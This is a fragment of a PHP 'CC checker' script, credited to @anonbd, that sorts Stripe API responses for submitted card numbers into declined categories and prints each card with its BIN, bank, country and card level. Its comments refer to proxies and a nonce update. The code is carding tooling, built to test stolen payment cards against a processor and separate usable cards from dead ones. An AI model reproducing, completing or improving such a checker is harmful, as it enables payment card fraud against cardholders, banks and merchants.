    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Service Not Allowed</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
  } 

elseif
(strpos($result2,  '"cvc_check": "unchecked"')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: CVC Unchecked</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
  } 

elseif
(strpos($result2,  '"cvc_check": "unavailable"')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: CVC Unavailable </span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
  } 

elseif
(strpos($result2,  "parameter_invalid_empty")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Parameter Invalid Empty</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
  } 

elseif
(strpos($result2,  "lock_timeout")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Lock Timeout</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
  } 

elseif
(strpos($result2,  "transaction_not_allowed")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Transaction Not Allowed</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
  } 

elseif
(strpos($result2, "three_d_secure_redirect")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: 3D Secure Redirect</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
  } 

elseif
(strpos($result2,  'Card is declined by your bank, please contact them for additional information.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Card Is Declined By Your Bank, Please Contact Them For Additional Information.</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
  } 

elseif
(strpos($result2, "missing_payment_information")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Missing Payment Information</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
  } 

elseif
(strpos($result2, "Payment cannot be processed, missing credit card number")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Payment Cannot Be Processed, Missing Credit Card Number</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
  } 



# ----------------------------------------------------- [Reprovada,Decline Responses END ] -------------------------------------- #



# ------------------------------------------- [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses ] ---------------------------------- #

elseif 
(strpos($result2,  '-1')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Update Nonce </span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
  }

else {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Dead Proxy/Error Not listed/CC Checker Dead</span> | <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span> | <span class="badge badge-success"> 👑 @anonbd 👑 </span></br>';
  }
# --------------------------------- [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses END ] --------------------------------------- #

# ----------------------------------------------------------- [Responses END] --------------------------------------------------- #

curl_close($ch);
ob_flush();

echo "<b>1REQ Result:</b> $result1<br><br>";
echo "<b>2REQ Result:</b> $result2<br><br>";

#---------------------------------------------------------------------------------------------------------------------------------#
#---------------------------------------------------[MADE BY @ANONBD]----------------------------------------------------#
#---------------------------------------------------------------------------------------------------------------------------------#

?>
